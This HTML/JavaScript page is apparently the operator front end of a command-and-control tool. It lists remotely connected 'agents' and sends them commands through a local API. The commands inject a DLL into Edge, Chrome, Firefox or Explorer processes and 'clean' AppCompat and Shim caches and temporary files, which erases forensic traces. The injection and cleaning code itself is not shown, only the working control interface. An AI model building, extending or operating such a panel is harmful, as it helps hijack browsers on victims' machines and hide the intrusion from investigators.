<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Remote Control Panel</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            color: #fff;
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
        }
        
        header {
            text-align: center;
            padding: 30px 0;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
            margin-bottom: 40px;
        }
        
        h1 {
            font-size: 2.5rem;
            margin-bottom: 10px;
            background: linear-gradient(90deg, #00b4db, #0083b0);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        
        .subtitle {
            color: #aaa;
            font-size: 1.1rem;
        }
        
        .dashboard {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 30px;
            margin-bottom: 40px;
        }
        
        @media (max-width: 768px) {
            .dashboard {
                grid-template-columns: 1fr;
            }
        }
        
        .card {
            background: rgba(255, 255, 255, 0.05);
            border-radius: 15px;
            padding: 25px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            transition: transform 0.3s, box-shadow 0.3s;
        }
        
        .card:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
        }
        
        .card h2 {
            color: #00b4db;
            margin-bottom: 20px;
            font-size: 1.5rem;
        }
        
        .agents-list {
            max-height: 300px;
            overflow-y: auto;
        }
        
        .agent-item {
            background: rgba(255, 255, 255, 0.1);
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 10px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .agent-status {
            display: inline-block;
            width: 10px;
            height: 10px;
            border-radius: 50%;
            margin-right: 10px;
        }
        
        .status-connected {
            background: #00ff00;
            box-shadow: 0 0 10px #00ff00;
        }
        
        .status-disconnected {
            background: #ff0000;
        }
        
        .btn {
            background: linear-gradient(90deg, #00b4db, #0083b0);
            color: white;
            border: none;
            padding: 12px 25px;
            border-radius: 8px;
            cursor: pointer;
            font-weight: bold;
            transition: transform 0.2s, box-shadow 0.2s;
            margin: 5px;
        }
        
        .btn:hover {
            transform: scale(1.05);
            box-shadow: 0 5px 20px rgba(0, 180, 219, 0.4);
        }
        
        .btn-danger {
            background: linear-gradient(90deg, #ff416c, #ff4b2b);
        }
        
        .btn-success {
            background: linear-gradient(90deg, #00b09b, #96c93d);
        }
        
        .controls {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin-top: 20px;
        }
        
        .control-group {
            display: flex;
            flex-direction: column;
            gap: 10px;
        }
        
        select, input {
            padding: 12px;
            border-radius: 8px;
            border: 1px solid rgba(255, 255, 255, 0.2);
            background: rgba(255, 255, 255, 0.1);
            color: white;
            font-size: 1rem;
        }
        
        option {
            background: #1a1a2e;
        }
        
        .log-panel {
            background: rgba(0, 0, 0, 0.3);
            border-radius: 10px;
            padding: 20px;
            margin-top: 30px;
        }
        
        .log-content {
            height: 200px;
            overflow-y: auto;
            font-family: monospace;
            font-size: 0.9rem;
            padding: 10px;
            background: rgba(0, 0, 0, 0.5);
            border-radius: 5px;
        }
        
        .log-entry {
            margin-bottom: 5px;
            padding: 5px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        .log-time {
            color: #00b4db;
        }
        
        .log-message {
            color: #fff;
        }
        
        .status-indicator {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 20px;
        }
        
        .status-dot {
            width: 12px;
            height: 12px;
            border-radius: 50%;
            animation: pulse 2s infinite;
        }
        
        .status-online {
            background: #00ff00;
        }
        
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>Remote Control Panel</h1>
            <p class="subtitle">Control injection and cleaning operations remotely</p>
            <div class="status-indicator">
                <div class="status-dot status-online" id="serverStatus"></div>
                <span id="statusText">Connecting to server...</span>
            </div>
        </header>
        
        <div class="dashboard">
            <div class="card">
                <h2>Connected Agents</h2>
                <div class="agents-list" id="agentsList">
                    <!-- Agents will be listed here -->
                    <div class="agent-item">
                        <div>
                            <span class="agent-status status-connected"></span>
                            <strong>Agent_192.168.1.100_8080</strong>
                        </div>
                        <span>Connected</span>
                    </div>
                </div>
                <button class="btn" onclick="refreshAgents()">Refresh Agents</button>
            </div>
            
            <div class="card">
                <h2>Quick Actions</h2>
                <div class="controls">
                    <div class="control-group">
                        <label>Select Agent:</label>
                        <select id="agentSelect">
                            <option value="">Select an agent</option>
                        </select>
                    </div>
                    
                    <div class="control-group">
                        <label>Action Type:</label>
                        <select id="actionType">
                            <option value="inject">Inject DLL</option>
                            <option value="clean">Clean System</option>
                            <option value="status">Check Status</option>
                        </select>
                    </div>
                    
                    <div class="control-group" id="injectOptions">
                        <label>Target Process:</label>
                        <select id="targetProcess">
                            <option value="msedge.exe">Microsoft Edge</option>
                            <option value="chrome.exe">Google Chrome</option>
                            <option value="firefox.exe">Firefox</option>
                            <option value="explorer.exe">Windows Explorer</option>
                        </select>
                    </div>
                    
                    <div class="control-group" id="cleanOptions" style="display: none;">
                        <label>Clean Type:</label>
                        <select id="cleanType">
                            <option value="all">All Caches</option>
                            <option value="appcompat">AppCompat Cache</option>
                            <option value="shim">Shim Cache</option>
                            <option value="temp">Temporary Files</option>
                        </select>
                    </div>
                </div>
                
                <button class="btn btn-success" onclick="executeCommand()">Execute Command</button>
                <button class="btn btn-danger" onclick="stopAll()">Emergency Stop</button>
            </div>
        </div>
        
        <div class="card log-panel">
            <h2>Activity Log</h2>
            <div class="log-content" id="logContent">
                <!-- Log entries will appear here -->
                <div class="log-entry">
                    <span class="log-time">[21:15:30]</span>
                    <span class="log-message">System initialized. Ready for remote commands.</span>
                </div>
            </div>
            <button class="btn" onclick="clearLog()">Clear Log</button>
        </div>
    </div>

    <script>
        // Se aberto via file://, usa localhost. Se via servidor, usa a mesma origem.
        const API_URL = window.location.protocol === 'file:' ? 'http://localhost:8081' : '';
        let agents = [];
        
        // DOM elements
        const serverStatus = document.getElementById('serverStatus');
        const statusText = document.getElementById('statusText');
        const agentsList = document.getElementById('agentsList');
        const agentSelect = document.getElementById('agentSelect');
        const actionType = document.getElementById('actionType');
        const injectOptions = document.getElementById('injectOptions');
        const cleanOptions = document.getElementById('cleanOptions');
        const logContent = document.getElementById('logContent');
        
        // Initialize
        document.addEventListener('DOMContentLoaded', () => {
            checkServerStatus();
            refreshAgents();
            setupEventListeners();
            startAutoRefresh();
        });
        
        function setupEventListeners() {
            actionType.addEventListener('change', function() {
                if (this.value === 'inject') {
                    injectOptions.style.display = 'block';
                    cleanOptions.style.display = 'none';
                } else if (this.value === 'clean') {
                    injectOptions.style.display = 'none';
                    cleanOptions.style.display = 'block';
                } else {
                    injectOptions.style.display = 'none';
                    cleanOptions.style.display = 'none';
                }
            });
        }
        
        function checkServerStatus() {
            fetch(`${API_URL}/api/status`)
                .then(response => response.json())
                .then(data => {
                    serverStatus.className = 'status-dot status-online';
                    statusText.textContent = `Server connected (${data.version})`;
                    addLog('Server status: Connected', 'success');
                })
                .catch(error => {
                    serverStatus.className = 'status-dot status-disconnected';
                    statusText.textContent = 'Server disconnected';
                    addLog('Server status: Disconnected', 'error');
                });
        }
        
        function refreshAgents() {
            fetch(`${API_URL}/api/agents`)
                .then(response => response.json())
                .then(data => {
                    agents = data.agents || [];
                    updateAgentsList();
                    updateAgentSelect();
                    addLog(`Refreshed agents list: ${agents.length} connected`, 'info');
                })
                .catch(error => {
                    addLog('Failed to fetch agents', 'error');
                });
        }
        
        function updateAgentsList() {
            agentsList.innerHTML = '';
            
            if (agents.length === 0) {
                agentsList.innerHTML = '<div class="agent-item">No agents connected</div>';
                return;
            }
            
            agents.forEach(agent => {
                const agentElement = document.createElement('div');
                agentElement.className = 'agent-item';
                
                const statusClass = agent.status === 'connected' ? 'status-connected' : 'status-disconnected';
                
                agentElement.innerHTML = `
                    <div>
                        <span class="agent-status ${statusClass}"></span>
                        <strong>${agent.agent_id || 'Unknown Agent'}</strong>
                    </div>
                    <span>${agent.ip || 'Unknown IP'}:${agent.port || 'Unknown Port'}</span>
                `;
                
                agentsList.appendChild(agentElement);
            });
        }
        
        function updateAgentSelect() {
            agentSelect.innerHTML = '<option value="">Select an agent</option>';
            
            agents.forEach(agent => {
                const option = document.createElement('option');
                option.value = agent.agent_id;
                option.textContent = `${agent.agent_id} (${agent.ip})`;
                agentSelect.appendChild(option);
            });
        }
        
        function executeCommand() {
            const selectedAgent = agentSelect.value;
            const commandType = actionType.value;
            
            if (!selectedAgent) {
                alert('Please select an agent first');
                return;
            }
            
            let endpoint = '';
            let payload = { agent_id: selectedAgent };
            
            switch (commandType) {
                case 'inject':
                    endpoint = '/api/inject';
                    payload.target = document.getElementById('targetProcess').value;
                    break;
                case 'clean':
                    endpoint = '/api/clean';
                    payload.type = document.getElementById('cleanType').value;
                    break;
                case 'status':
                    endpoint = '/api/command';
                    payload.command = 'status';
                    break;
                default:
                    alert('Invalid command type');
                    return;
            }
            
            addLog(`Sending ${commandType} command to ${selectedAgent}...`, 'info');
            
            fetch(`${API_URL}${endpoint}`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(payload)
            })
            .then(response => response.json())
            .then(data => {
                addLog(`Command executed: ${JSON.stringify(data)}`, 'success');
            })
            .catch(error => {
                addLog(`Command failed: ${error.message}`, 'error');
            });
        }
        
        function stopAll() {
            if (confirm('Are you sure you want to stop all operations? This is an emergency stop.')) {
                agents.forEach(agent => {
                    fetch(`${API_URL}/api/command`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            agent_id: agent.agent_id,
                            command: 'stop',
                            params: { emergency: true }
                        })
                    })
                    .then(response => response.json())
                    .then(data => {
                        addLog(`Emergency stop sent to ${agent.agent_id}`, 'warning');
                    })
                    .catch(error => {
                        addLog(`Failed to send stop to ${agent.agent_id}`, 'error');
                    });
                });
                
                addLog('Emergency stop initiated for all agents', 'warning');
            }
        }
        
        function addLog(message, type = 'info') {
            const now = new Date();
            const timeString = `[${now.getHours().toString().padStart(2, '0')}:${now.getMinutes().toString().padStart(2, '0')}:${now.getSeconds().toString().padStart(2, '0')}]`;
            
            const logEntry = document.createElement('div');
            logEntry.className = 'log-entry';
            
            let typeClass = '';
            switch (type) {
                case 'success': typeClass = 'color: #00ff00'; break;
                case 'error': typeClass = 'color: #ff0000'; break;
                case 'warning': typeClass = 'color: #ffff00'; break;
                default: typeClass = 'color: #ffffff';
            }
            
            logEntry.innerHTML = `
                <span class="log-time">${timeString}</span>
                <span class="log-message" style="${typeClass}">${message}</span>
            `;
            
            logContent.appendChild(logEntry);
            logContent.scrollTop = logContent.scrollHeight;
        }
        
        function clearLog() {
            logContent.innerHTML = '';
            addLog('Log cleared', 'info');
        }
        
        function startAutoRefresh() {
            // Auto-refresh agents every 10 seconds
            setInterval(refreshAgents, 10000);
            
            // Auto-check server status every 5 seconds
            setInterval(checkServerStatus, 5000);
        }
    </script>
</body>
</html>
